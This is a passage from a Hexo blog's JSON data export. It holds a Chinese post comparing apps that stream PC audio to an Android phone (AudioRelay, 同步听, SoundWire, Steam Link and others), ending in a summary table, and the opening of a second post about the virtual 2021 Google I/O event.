基本信息\n\n- 这是一款非常简单的国产软件，已经有几年没更新了，找不到官网链接，但网上还是能搜到下载资源。\n- 注意我们只需要下载Windows程序即可，因为手机连接电脑后会自动安装Apk。\n\n#### 体验\n\n虽然是老软件，但实用性还是很强的。安装后打开PC端，UI非常小（jian）巧（lou），提示你通过无线或有线的方式连接：\n\n![AudioSync6](https://cdn.sspai.com/2021/04/13/71b2bebaa905578065f27340bc8badc5.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1)\n\n实际使用过程中，无线的方式我目前还没摸索出来要怎么连接。个人理解它这里的通过WiFi连接和AudioRelay的方式不同，是指的手机作为热点，让电脑去连接手机。\n\n那我就试试USB连接吧。连接之前请确保**开启USB调试**，Apk会自动安装，首次打开如果ROM版本比较高的话会有一些系统兼容性提示（因为我是Android 11），但不要紧，不影响使用，包括下面这个错误提示也没事：\n\n![AudioSync4](https://cdn.sspai.com/2021/04/13/78fe4bf1326915d2ca42252ab2dbb566.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1)\n\n连接成功后，点击收听，两端UI都会变成这种状态，表示已经可以输出音频了，整个过程其实也非常简单：\n\n![AudioSync7](https://cdn.sspai.com/2021/04/13/fa0ebd04591d831a239678c10d69e807.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1)\n\n同步听几乎没有可配置的选项，但个人体验感觉音质和延迟和AudioRelay基本没有差异，让我挺惊讶的。这完全就是极简实用的典范呢！不搞花里花哨的东西。\n\n### SoundWire\n\n#### 基本信息\n\n- 官网：[http://georgielabs.net/](http://georgielabs.net/)。此软件和AudioRelay的原理和使用方式很类似。\n- Play Store上也能搜到，但从评论反馈来看有很多人使用不了。\n\n#### 体验\n\n还是先安装PC端，打开后发现UI还蛮复古的：\n\n![SoundWire4](https://cdn.sspai.com/2021/04/13/2871a9f8f1e3890a77f2ebbf15efd830.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1)\n\n会自动生成局域网IP地址，还支持录音什么的。接下来打开Android端，首次使用它会提示你连击中间的图标即可连接，长按是自动检测并连接。然而，不管我是自动还是手动，都没法玩：\n\n![SoundWire1](https://cdn.sspai.com/2021/04/13/57c8e7129b7b1d11d59a1f83f32824e1.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1)\n\n也不知道是不是Android 11系统版本兼容的问题，总之没法体验了。但看上去应该和AudioRelay是差不多的玩意。\n\n### Steam Link\n\n#### 基本信息\n\n- 谁也没想到我电脑上的Steam也能满足我的需求，其实本质上就是**共享屏幕和远程控制**（流式传输音视频数据），如果你是Steam用户，不妨试试这个。\n- 需要在Android端下载安装Steam Link，Play Store可以搜到。\n\n#### 体验\n\n同样的，需要PC和手机处于同一局域网中，保持PC端打开Steam，然后打开手机上的Steam Link，会自动扫描设备：\n\n![SteamLink6](https://cdn.sspai.com/2021/04/13/186d7c453511da65ab69b288ecee1eaf.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1)\n\n点击后会先进行测速，这个基本上就是你的WiFi极速，一般情况下传输音视频是没问题的：\n\n![SteamLink3](https://cdn.sspai.com/2021/04/13/b3e0d9652e875b3c6f2b94d458b6a9ab.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1)\n\n和任何端到端设备配对逻辑一样，需要在PC端输入PIN码即可连接：\n\n![SteamLink8](https://cdn.sspai.com/2021/04/13/c7f11d47e7df4f67c3171acde7f2872d.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1)\n\n连接成功后，就可以用手机来玩电脑上的Steam游戏了，当然也是通过手机来输出电脑音频的，这对家境贫寒又缺音响又缺手柄的我来说，再好不过了。\n\n![SteamLink1](https://cdn.sspai.com/2021/04/13/b3a1649bd736d5009223627382b1f6a5.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1)\n\n可实时显示并控制PC端：\n\n![SteamLink2](https://cdn.sspai.com/2021/04/13/1dd4ccf57aedb5eaa9608e6524e42362.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1)\n\n### 其他\n\n- TeamViewer：这是比较知名的远程控制软件了，不仅支持局域网还支持广域网，原理和使用方式基本和Steam Link差不多，都算是有点大材小用了，毕竟我们只是想输出PC的音频而已。\n- 直播软件：PC端开播，手机看直播，很好理解。不过成本也挺高的。\n\n## 总结\n\n| 方案       | 平台组合          | 音质 | 延迟 | 连接       | 传输   |\n| ---------- | ----------------- | ---- | ---- | ---------- | ------ |\n| AudioRelay | Win+Android       | 中高 | 低   | 局域网/USB | 音频   |\n| 同步听     | Win+Android       | 中高 | 低   | 局域网/USB | 音频   |\n| SoundWire  | Win/Linux+Android | 中高 | 中   | 局域网     | 音频   |\n| Steam Link | 全平台            | 中   | 低   | 局域网     | 音视频 |\n| TeamViewer | 全平台            | 中   | 中高 | 广域网     | 音视频 |\n| 直播软件   | 全平台            | 高   | 低   | 广域网     | 音视频 |\n\n个人综合体验最好的还是AudioRelay，最简单实用的是同步听。\n","slug":"忘了买电脑音响？手机来替代！","published":1,"updated":"2024-03-25T07:31:25.866Z","comments":1,"photos":[],"link":"","_id":"cluaufh1a003sthe68wlfbnkh","content":"<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h2><p>前段时间把吃灰的台式电脑搬出来用，我竟然忘了它没配音响，可我现在就想玩游戏听音乐，也不想买音响，怎么办？除此之外，我相信很多公司的办公台式电脑也是没有带音响的，老板告诉你：上个班还要听啥响？好好搬砖就行了。但有时候加班到四下无人的时候，确实会产生一种想要外放音乐的欲望。</p>\n<p>此情此景，我摸了摸我的双扬声器小米10，不仅感叹道：你就是个天生的便携音响呀！于是，我开始寻找让手机和电脑通信并传输音频数据的方法。</p>\n<p>从流媒体的理论上讲，无非就是电脑将音频数据传输到手机上播放，电脑端作为Server，手机端作为Client，这样一个简单的C&#x2F;S架构。大致我能想到3种传输方式：</p>\n<ul>\n<li>通过局域网传输数据（例如同时连接某一WiFi）</li>\n<li>通过USB等有线的方式传输数据</li>\n<li>通过蓝牙配对连接来传输数据</li>\n</ul>\n<p>下面我们就来探索一下现有的可行方案。</p>\n<h2 id=\"实践\"><a href=\"#实践\" class=\"headerlink\" title=\"实践\"></a>实践</h2><h3 id=\"AudioRelay\"><a href=\"#AudioRelay\" class=\"headerlink\" title=\"AudioRelay\"></a>AudioRelay</h3><h4 id=\"基本信息\"><a href=\"#基本信息\" class=\"headerlink\" title=\"基本信息\"></a>基本信息</h4><ul>\n<li>有官网：<a href=\"https://audiorelay.net/\">https://audiorelay.net/</a> ，提供Windows和Android应用程序下载。</li>\n<li>Android端在Play Store上也能搜到，简介就是 <strong>Stream your PC audio on Wifi or USB</strong> ,也一直在保持更新。</li>\n</ul>\n<h4 id=\"体验\"><a href=\"#体验\" class=\"headerlink\" title=\"体验\"></a>体验</h4><p>下载安装后，先打开PC端，第一次使用时，会有简单的提示引导你检查防火墙是否干扰了正常使用，直接点击 <strong>CHECK FIREWALL</strong> 就可以了。</p>\n<p>各项配置简单明了，甚至还支持Dark Mode。同时，局域网IP会自动分配，<strong>此时你的PC就成为一台输出音频数据的Server</strong>。</p>\n<p><img src=\"https://cdn.sspai.com/2021/04/13/5ef82a76495b0c5b1e3720493380f073.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"AudioRelay6\"></p>\n<p>再打开作为Client的Android端，它会自动搜索局域网内可用的Server，并在音频输出一栏列出，点击后即可自动连接，然后手机就成功成为电脑的音响设备了（还支持多个Client连接同一个Server），真的非常方便。</p>\n<p><img src=\"https://cdn.sspai.com/2021/04/13/1821d860b0a7ad6f422d05c43ff9ec07.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"AudioRelay1\"></p>\n<p>从显示数据和我个人体验来看，传输延迟是非常低的，基本可以保持在<strong>10毫秒以内</strong>。偶尔会有一点丢包导致的小卡顿，但无伤大雅，玩游戏都是没有问题的。当然音质的话，就不能要求过高了。</p>\n<p>连接成功后还可更改输出通道，以便用户进行音质和延迟之间的取舍：</p>\n<p><img src=\"https://cdn.sspai.com/2021/04/13/79087969e71c795dc28449950df43ea5.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"AudioRelay2\"></p>\n<p>如果要追求更低的延迟，建议使用USB连接手机和电脑，我这里主要是使用无线的方式。AudioRelay的设置项也是比较丰富的，可自定义音质、通道和缓冲大小等，大家可自行体验：</p>\n<p><img src=\"https://cdn.sspai.com/2021/04/13/7341e25b789fcfd9438500c8316f71a5.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"AudioRelay3\"></p>\n<h3 id=\"同步听\"><a href=\"#同步听\" class=\"headerlink\" title=\"同步听\"></a>同步听</h3><h4 id=\"基本信息-1\"><a href=\"#基本信息-1\" class=\"headerlink\" title=\"基本信息\"></a>基本信息</h4><ul>\n<li>这是一款非常简单的国产软件，已经有几年没更新了，找不到官网链接，但网上还是能搜到下载资源。</li>\n<li>注意我们只需要下载Windows程序即可，因为手机连接电脑后会自动安装Apk。</li>\n</ul>\n<h4 id=\"体验-1\"><a href=\"#体验-1\" class=\"headerlink\" title=\"体验\"></a>体验</h4><p>虽然是老软件，但实用性还是很强的。安装后打开PC端，UI非常小（jian）巧（lou），提示你通过无线或有线的方式连接：</p>\n<p><img src=\"https://cdn.sspai.com/2021/04/13/71b2bebaa905578065f27340bc8badc5.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"AudioSync6\"></p>\n<p>实际使用过程中，无线的方式我目前还没摸索出来要怎么连接。个人理解它这里的通过WiFi连接和AudioRelay的方式不同，是指的手机作为热点，让电脑去连接手机。</p>\n<p>那我就试试USB连接吧。连接之前请确保<strong>开启USB调试</strong>，Apk会自动安装，首次打开如果ROM版本比较高的话会有一些系统兼容性提示（因为我是Android 11），但不要紧，不影响使用，包括下面这个错误提示也没事：</p>\n<p><img src=\"https://cdn.sspai.com/2021/04/13/78fe4bf1326915d2ca42252ab2dbb566.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"AudioSync4\"></p>\n<p>连接成功后，点击收听，两端UI都会变成这种状态，表示已经可以输出音频了，整个过程其实也非常简单：</p>\n<p><img src=\"https://cdn.sspai.com/2021/04/13/fa0ebd04591d831a239678c10d69e807.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"AudioSync7\"></p>\n<p>同步听几乎没有可配置的选项，但个人体验感觉音质和延迟和AudioRelay基本没有差异，让我挺惊讶的。这完全就是极简实用的典范呢！不搞花里花哨的东西。</p>\n<h3 id=\"SoundWire\"><a href=\"#SoundWire\" class=\"headerlink\" title=\"SoundWire\"></a>SoundWire</h3><h4 id=\"基本信息-2\"><a href=\"#基本信息-2\" class=\"headerlink\" title=\"基本信息\"></a>基本信息</h4><ul>\n<li>官网：<a href=\"http://georgielabs.net/\">http://georgielabs.net/</a>。此软件和AudioRelay的原理和使用方式很类似。</li>\n<li>Play Store上也能搜到，但从评论反馈来看有很多人使用不了。</li>\n</ul>\n<h4 id=\"体验-2\"><a href=\"#体验-2\" class=\"headerlink\" title=\"体验\"></a>体验</h4><p>还是先安装PC端，打开后发现UI还蛮复古的：</p>\n<p><img src=\"https://cdn.sspai.com/2021/04/13/2871a9f8f1e3890a77f2ebbf15efd830.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"SoundWire4\"></p>\n<p>会自动生成局域网IP地址，还支持录音什么的。接下来打开Android端，首次使用它会提示你连击中间的图标即可连接，长按是自动检测并连接。然而，不管我是自动还是手动，都没法玩：</p>\n<p><img src=\"https://cdn.sspai.com/2021/04/13/57c8e7129b7b1d11d59a1f83f32824e1.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"SoundWire1\"></p>\n<p>也不知道是不是Android 11系统版本兼容的问题，总之没法体验了。但看上去应该和AudioRelay是差不多的玩意。</p>\n<h3 id=\"Steam-Link\"><a href=\"#Steam-Link\" class=\"headerlink\" title=\"Steam Link\"></a>Steam Link</h3><h4 id=\"基本信息-3\"><a href=\"#基本信息-3\" class=\"headerlink\" title=\"基本信息\"></a>基本信息</h4><ul>\n<li>谁也没想到我电脑上的Steam也能满足我的需求，其实本质上就是<strong>共享屏幕和远程控制</strong>（流式传输音视频数据），如果你是Steam用户，不妨试试这个。</li>\n<li>需要在Android端下载安装Steam Link，Play Store可以搜到。</li>\n</ul>\n<h4 id=\"体验-3\"><a href=\"#体验-3\" class=\"headerlink\" title=\"体验\"></a>体验</h4><p>同样的，需要PC和手机处于同一局域网中，保持PC端打开Steam，然后打开手机上的Steam Link，会自动扫描设备：</p>\n<p><img src=\"https://cdn.sspai.com/2021/04/13/186d7c453511da65ab69b288ecee1eaf.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"SteamLink6\"></p>\n<p>点击后会先进行测速，这个基本上就是你的WiFi极速，一般情况下传输音视频是没问题的：</p>\n<p><img src=\"https://cdn.sspai.com/2021/04/13/b3e0d9652e875b3c6f2b94d458b6a9ab.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"SteamLink3\"></p>\n<p>和任何端到端设备配对逻辑一样，需要在PC端输入PIN码即可连接：</p>\n<p><img src=\"https://cdn.sspai.com/2021/04/13/c7f11d47e7df4f67c3171acde7f2872d.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"SteamLink8\"></p>\n<p>连接成功后，就可以用手机来玩电脑上的Steam游戏了，当然也是通过手机来输出电脑音频的，这对家境贫寒又缺音响又缺手柄的我来说，再好不过了。</p>\n<p><img src=\"https://cdn.sspai.com/2021/04/13/b3a1649bd736d5009223627382b1f6a5.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"SteamLink1\"></p>\n<p>可实时显示并控制PC端：</p>\n<p><img src=\"https://cdn.sspai.com/2021/04/13/1dd4ccf57aedb5eaa9608e6524e42362.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"SteamLink2\"></p>\n<h3 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h3><ul>\n<li>TeamViewer：这是比较知名的远程控制软件了，不仅支持局域网还支持广域网，原理和使用方式基本和Steam Link差不多，都算是有点大材小用了，毕竟我们只是想输出PC的音频而已。</li>\n<li>直播软件：PC端开播，手机看直播，很好理解。不过成本也挺高的。</li>\n</ul>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><table>\n<thead>\n<tr>\n<th>方案</th>\n<th>平台组合</th>\n<th>音质</th>\n<th>延迟</th>\n<th>连接</th>\n<th>传输</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>AudioRelay</td>\n<td>Win+Android</td>\n<td>中高</td>\n<td>低</td>\n<td>局域网&#x2F;USB</td>\n<td>音频</td>\n</tr>\n<tr>\n<td>同步听</td>\n<td>Win+Android</td>\n<td>中高</td>\n<td>低</td>\n<td>局域网&#x2F;USB</td>\n<td>音频</td>\n</tr>\n<tr>\n<td>SoundWire</td>\n<td>Win&#x2F;Linux+Android</td>\n<td>中高</td>\n<td>中</td>\n<td>局域网</td>\n<td>音频</td>\n</tr>\n<tr>\n<td>Steam Link</td>\n<td>全平台</td>\n<td>中</td>\n<td>低</td>\n<td>局域网</td>\n<td>音视频</td>\n</tr>\n<tr>\n<td>TeamViewer</td>\n<td>全平台</td>\n<td>中</td>\n<td>中高</td>\n<td>广域网</td>\n<td>音视频</td>\n</tr>\n<tr>\n<td>直播软件</td>\n<td>全平台</td>\n<td>高</td>\n<td>低</td>\n<td>广域网</td>\n<td>音视频</td>\n</tr>\n</tbody></table>\n<p>个人综合体验最好的还是AudioRelay，最简单实用的是同步听。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h2><p>前段时间把吃灰的台式电脑搬出来用，我竟然忘了它没配音响，可我现在就想玩游戏听音乐，也不想买音响，怎么办？除此之外，我相信很多公司的办公台式电脑也是没有带音响的，老板告诉你：上个班还要听啥响？好好搬砖就行了。但有时候加班到四下无人的时候，确实会产生一种想要外放音乐的欲望。</p>\n<p>此情此景，我摸了摸我的双扬声器小米10，不仅感叹道：你就是个天生的便携音响呀！于是，我开始寻找让手机和电脑通信并传输音频数据的方法。</p>\n<p>从流媒体的理论上讲，无非就是电脑将音频数据传输到手机上播放，电脑端作为Server，手机端作为Client，这样一个简单的C&#x2F;S架构。大致我能想到3种传输方式：</p>\n<ul>\n<li>通过局域网传输数据（例如同时连接某一WiFi）</li>\n<li>通过USB等有线的方式传输数据</li>\n<li>通过蓝牙配对连接来传输数据</li>\n</ul>\n<p>下面我们就来探索一下现有的可行方案。</p>\n<h2 id=\"实践\"><a href=\"#实践\" class=\"headerlink\" title=\"实践\"></a>实践</h2><h3 id=\"AudioRelay\"><a href=\"#AudioRelay\" class=\"headerlink\" title=\"AudioRelay\"></a>AudioRelay</h3><h4 id=\"基本信息\"><a href=\"#基本信息\" class=\"headerlink\" title=\"基本信息\"></a>基本信息</h4><ul>\n<li>有官网：<a href=\"https://audiorelay.net/\">https://audiorelay.net/</a> ，提供Windows和Android应用程序下载。</li>\n<li>Android端在Play Store上也能搜到，简介就是 <strong>Stream your PC audio on Wifi or USB</strong> ,也一直在保持更新。</li>\n</ul>\n<h4 id=\"体验\"><a href=\"#体验\" class=\"headerlink\" title=\"体验\"></a>体验</h4><p>下载安装后，先打开PC端，第一次使用时，会有简单的提示引导你检查防火墙是否干扰了正常使用，直接点击 <strong>CHECK FIREWALL</strong> 就可以了。</p>\n<p>各项配置简单明了，甚至还支持Dark Mode。同时，局域网IP会自动分配，<strong>此时你的PC就成为一台输出音频数据的Server</strong>。</p>\n<p><img src=\"https://cdn.sspai.com/2021/04/13/5ef82a76495b0c5b1e3720493380f073.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"AudioRelay6\"></p>\n<p>再打开作为Client的Android端，它会自动搜索局域网内可用的Server，并在音频输出一栏列出，点击后即可自动连接，然后手机就成功成为电脑的音响设备了（还支持多个Client连接同一个Server），真的非常方便。</p>\n<p><img src=\"https://cdn.sspai.com/2021/04/13/1821d860b0a7ad6f422d05c43ff9ec07.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"AudioRelay1\"></p>\n<p>从显示数据和我个人体验来看，传输延迟是非常低的，基本可以保持在<strong>10毫秒以内</strong>。偶尔会有一点丢包导致的小卡顿，但无伤大雅，玩游戏都是没有问题的。当然音质的话，就不能要求过高了。</p>\n<p>连接成功后还可更改输出通道，以便用户进行音质和延迟之间的取舍：</p>\n<p><img src=\"https://cdn.sspai.com/2021/04/13/79087969e71c795dc28449950df43ea5.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"AudioRelay2\"></p>\n<p>如果要追求更低的延迟，建议使用USB连接手机和电脑，我这里主要是使用无线的方式。AudioRelay的设置项也是比较丰富的，可自定义音质、通道和缓冲大小等，大家可自行体验：</p>\n<p><img src=\"https://cdn.sspai.com/2021/04/13/7341e25b789fcfd9438500c8316f71a5.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"AudioRelay3\"></p>\n<h3 id=\"同步听\"><a href=\"#同步听\" class=\"headerlink\" title=\"同步听\"></a>同步听</h3><h4 id=\"基本信息-1\"><a href=\"#基本信息-1\" class=\"headerlink\" title=\"基本信息\"></a>基本信息</h4><ul>\n<li>这是一款非常简单的国产软件，已经有几年没更新了，找不到官网链接，但网上还是能搜到下载资源。</li>\n<li>注意我们只需要下载Windows程序即可，因为手机连接电脑后会自动安装Apk。</li>\n</ul>\n<h4 id=\"体验-1\"><a href=\"#体验-1\" class=\"headerlink\" title=\"体验\"></a>体验</h4><p>虽然是老软件，但实用性还是很强的。安装后打开PC端，UI非常小（jian）巧（lou），提示你通过无线或有线的方式连接：</p>\n<p><img src=\"https://cdn.sspai.com/2021/04/13/71b2bebaa905578065f27340bc8badc5.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"AudioSync6\"></p>\n<p>实际使用过程中，无线的方式我目前还没摸索出来要怎么连接。个人理解它这里的通过WiFi连接和AudioRelay的方式不同，是指的手机作为热点，让电脑去连接手机。</p>\n<p>那我就试试USB连接吧。连接之前请确保<strong>开启USB调试</strong>，Apk会自动安装，首次打开如果ROM版本比较高的话会有一些系统兼容性提示（因为我是Android 11），但不要紧，不影响使用，包括下面这个错误提示也没事：</p>\n<p><img src=\"https://cdn.sspai.com/2021/04/13/78fe4bf1326915d2ca42252ab2dbb566.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"AudioSync4\"></p>\n<p>连接成功后，点击收听，两端UI都会变成这种状态，表示已经可以输出音频了，整个过程其实也非常简单：</p>\n<p><img src=\"https://cdn.sspai.com/2021/04/13/fa0ebd04591d831a239678c10d69e807.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"AudioSync7\"></p>\n<p>同步听几乎没有可配置的选项，但个人体验感觉音质和延迟和AudioRelay基本没有差异，让我挺惊讶的。这完全就是极简实用的典范呢！不搞花里花哨的东西。</p>\n<h3 id=\"SoundWire\"><a href=\"#SoundWire\" class=\"headerlink\" title=\"SoundWire\"></a>SoundWire</h3><h4 id=\"基本信息-2\"><a href=\"#基本信息-2\" class=\"headerlink\" title=\"基本信息\"></a>基本信息</h4><ul>\n<li>官网：<a href=\"http://georgielabs.net/\">http://georgielabs.net/</a>。此软件和AudioRelay的原理和使用方式很类似。</li>\n<li>Play Store上也能搜到，但从评论反馈来看有很多人使用不了。</li>\n</ul>\n<h4 id=\"体验-2\"><a href=\"#体验-2\" class=\"headerlink\" title=\"体验\"></a>体验</h4><p>还是先安装PC端，打开后发现UI还蛮复古的：</p>\n<p><img src=\"https://cdn.sspai.com/2021/04/13/2871a9f8f1e3890a77f2ebbf15efd830.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"SoundWire4\"></p>\n<p>会自动生成局域网IP地址，还支持录音什么的。接下来打开Android端，首次使用它会提示你连击中间的图标即可连接，长按是自动检测并连接。然而，不管我是自动还是手动，都没法玩：</p>\n<p><img src=\"https://cdn.sspai.com/2021/04/13/57c8e7129b7b1d11d59a1f83f32824e1.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"SoundWire1\"></p>\n<p>也不知道是不是Android 11系统版本兼容的问题，总之没法体验了。但看上去应该和AudioRelay是差不多的玩意。</p>\n<h3 id=\"Steam-Link\"><a href=\"#Steam-Link\" class=\"headerlink\" title=\"Steam Link\"></a>Steam Link</h3><h4 id=\"基本信息-3\"><a href=\"#基本信息-3\" class=\"headerlink\" title=\"基本信息\"></a>基本信息</h4><ul>\n<li>谁也没想到我电脑上的Steam也能满足我的需求，其实本质上就是<strong>共享屏幕和远程控制</strong>（流式传输音视频数据），如果你是Steam用户，不妨试试这个。</li>\n<li>需要在Android端下载安装Steam Link，Play Store可以搜到。</li>\n</ul>\n<h4 id=\"体验-3\"><a href=\"#体验-3\" class=\"headerlink\" title=\"体验\"></a>体验</h4><p>同样的，需要PC和手机处于同一局域网中，保持PC端打开Steam，然后打开手机上的Steam Link，会自动扫描设备：</p>\n<p><img src=\"https://cdn.sspai.com/2021/04/13/186d7c453511da65ab69b288ecee1eaf.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"SteamLink6\"></p>\n<p>点击后会先进行测速，这个基本上就是你的WiFi极速，一般情况下传输音视频是没问题的：</p>\n<p><img src=\"https://cdn.sspai.com/2021/04/13/b3e0d9652e875b3c6f2b94d458b6a9ab.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"SteamLink3\"></p>\n<p>和任何端到端设备配对逻辑一样，需要在PC端输入PIN码即可连接：</p>\n<p><img src=\"https://cdn.sspai.com/2021/04/13/c7f11d47e7df4f67c3171acde7f2872d.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"SteamLink8\"></p>\n<p>连接成功后，就可以用手机来玩电脑上的Steam游戏了，当然也是通过手机来输出电脑音频的，这对家境贫寒又缺音响又缺手柄的我来说，再好不过了。</p>\n<p><img src=\"https://cdn.sspai.com/2021/04/13/b3a1649bd736d5009223627382b1f6a5.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"SteamLink1\"></p>\n<p>可实时显示并控制PC端：</p>\n<p><img src=\"https://cdn.sspai.com/2021/04/13/1dd4ccf57aedb5eaa9608e6524e42362.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"SteamLink2\"></p>\n<h3 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h3><ul>\n<li>TeamViewer：这是比较知名的远程控制软件了，不仅支持局域网还支持广域网，原理和使用方式基本和Steam Link差不多，都算是有点大材小用了，毕竟我们只是想输出PC的音频而已。</li>\n<li>直播软件：PC端开播，手机看直播，很好理解。不过成本也挺高的。</li>\n</ul>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><table>\n<thead>\n<tr>\n<th>方案</th>\n<th>平台组合</th>\n<th>音质</th>\n<th>延迟</th>\n<th>连接</th>\n<th>传输</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>AudioRelay</td>\n<td>Win+Android</td>\n<td>中高</td>\n<td>低</td>\n<td>局域网&#x2F;USB</td>\n<td>音频</td>\n</tr>\n<tr>\n<td>同步听</td>\n<td>Win+Android</td>\n<td>中高</td>\n<td>低</td>\n<td>局域网&#x2F;USB</td>\n<td>音频</td>\n</tr>\n<tr>\n<td>SoundWire</td>\n<td>Win&#x2F;Linux+Android</td>\n<td>中高</td>\n<td>中</td>\n<td>局域网</td>\n<td>音频</td>\n</tr>\n<tr>\n<td>Steam Link</td>\n<td>全平台</td>\n<td>中</td>\n<td>低</td>\n<td>局域网</td>\n<td>音视频</td>\n</tr>\n<tr>\n<td>TeamViewer</td>\n<td>全平台</td>\n<td>中</td>\n<td>中高</td>\n<td>广域网</td>\n<td>音视频</td>\n</tr>\n<tr>\n<td>直播软件</td>\n<td>全平台</td>\n<td>高</td>\n<td>低</td>\n<td>广域网</td>\n<td>音视频</td>\n</tr>\n</tbody></table>\n<p>个人综合体验最好的还是AudioRelay，最简单实用的是同步听。</p>\n"},{"layout":"post","title":"我的2021 Google IO大会之旅","subtitle":"一次特别的会议。","date":"2021-06-15T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n此文为初稿备份，终稿已发布于少数派：[https://sspai.com/post/66830](https://sspai.com/post/66830)\n\n---\n\n2021年的 [Google I/O大会](https://events.google.com/io/about/?lng=zh-CN) 已经圆满闭幕，我们从下面几条官方的FAQ可以看出今年大会与往届有所不同：\n\n- 2021年Google I/O大会主要面向哪些人群？\n\n  全球范围内对Google技术感兴趣的开发者都应关注此次大会，以便了解最新的产品发布、Google专家的行业洞见，并进行实践性学习。\n\n- Google I/O 2021大会的举办时间和地点？\n\n  2021年开发者大会将于5月18日至20日以**虚拟形式**举办。\n\n- Google I/O 2021大会的费用是多少？\n\n  本届Google I/O大会对所有人免费，包括会上那些需要预约的内容，我们希望人人都能参与其中并从中获益。\n\n我觉得最有意思的就是这个线上虚拟大会，这基本上就是一个完整的在线RPG游戏。我相信这也是全世界大多数开发者人生中第一次“亲临”IO大会现场。\n\n![](2021-05-24-13-46-41-image.png)\n\n接下来我就带大家一起逛逛这次有趣的大会吧。\n\n## 初入乐园\n\n刚进入加载页面的时候，我们就能看见背景是整个大会的像素风地图全貌，可以看见内容还是蛮多的，有Android展区、Web展区、AI展区、Flutter展区、无障碍（Accessibility）展区等等。这真的好像一个游乐园啊，姑且请我称之为“**乐园**”，哈哈哈！\n\n![](2021-05-24-13-53-24-image.png)\n\n在加载过程中，会有排队等待、下载地图资源等提示，和游戏服务器一样的，进入之后会看见自己所处的线路。\n\n首次进入乐园需要定制自己角色的外观，包括左右手的**装饰、头饰、肤色、体型、发型**等，选项真的还不少呢，方脑袋、圆脑壳、瓜子脸应有尽有……从选项也可见大会的包容性还是很强的，不管你是四肢健全还是残障人士，都有选择（无障碍也是本次大会的一个主题之一）。\n\n![](2021-05-24-15-07-48-image.png)\n\n你可以扮演一个喝饮料的小朋友，可以扮演一个摄影爱好者，可以扮演一个做笔记的记者，也可以扮演一个到处搜集大会宣传资料的收藏家，这都取决于你的定制。\n\n![](2021-05-24-15-12-56-image.png)\n\n我能想象到的发色，这里面基本都有了。你甚至可以头上整点儿绿（无意间发现帽子和头发的选择居然有29项之多，实在是细），当然我还是选个中规中矩的黑色吧！\n\n![](2021-05-24-15-11-44-image.png)\n\n定制好角色之后，我第一件感兴趣的事情，就是看看这整个乐园是不是**无缝地图**，这大概是我的RPG游戏后遗症。操作角色的方法很简单，就是方向键控制移动。然后当我从一个展区（官方称之为“产品圆顶屋”）移动到另一个展区时，发现地图是需要重新加载的，看来并不是无缝的。\n\n不过，这也说明乐园整体是很大的，考虑到**性能问题**，不方便一次性加载。所以应该会有很多**彩蛋**等我们发掘。\n\n![](2021-05-2